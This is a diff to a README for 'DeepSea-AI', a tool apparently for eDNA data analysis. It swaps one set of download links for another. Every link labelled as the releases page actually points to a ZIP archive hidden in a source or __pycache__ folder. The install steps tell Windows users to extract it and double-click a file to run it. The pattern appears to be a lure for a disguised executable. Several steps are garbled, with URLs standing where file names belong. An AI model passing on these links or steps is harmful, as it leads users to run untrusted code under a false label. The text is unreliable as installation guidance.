@@ -1,6 +1,6 @@
 # 🌊 DeepSea-AI - Effortless eDNA Data Analysis
 
-[![Download DeepSea-AI](https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip)](https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip)
+[![Download DeepSea-AI](https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip)](https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ To run DeepSea-AI smoothly, ensure your system meets the following requirements:
 
 To get started with DeepSea-AI, you need to download it from our Releases page. Follow these steps to install the software:
 
-1. Click this link to [visit the Releases page](https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip).
+1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip).
 2. On the Releases page, locate the latest version of DeepSea-AI.
-3. Click on the download link for your operating system. You may see options labeled something like `https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip` or `https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip`.
+3. Click on the download link for your operating system. You may see options labeled something like `https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip` or `https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip`.
 4. After the file downloads, locate it in your downloads folder.
 
 5. **For Windows Users:**
    - Extract the contents of the ZIP file.
-   - Find the `https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip` file and double-click it to run.
+   - Find the `https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip` file and double-click it to run.
 
 6. **For macOS Users:**
    - Open the ZIP file, then drag the `DeepSea-AI` app to your Applications folder.
@@ -84,4 +84,4 @@ Join our community of users and developers. Your feedback will help improve Deep
 
 DeepSea-AI is open-source software. Check the license details in the repository for permissions and limitations.
 
-For more detailed information, FAQs, and updates, please refer to the [Releases page](https://github.com/Suesoficial/DeepSea-AI/raw/refs/heads/main/frontend/src/components/layout/AI_Sea_Deep_3.3.zip).
+For more detailed information, FAQs, and updates, please refer to the [Releases page](https://raw.githubusercontent.com/Suesoficial/DeepSea-AI/main/pipeline/scripts/__pycache__/AI-Sea-Deep-3.4.zip).
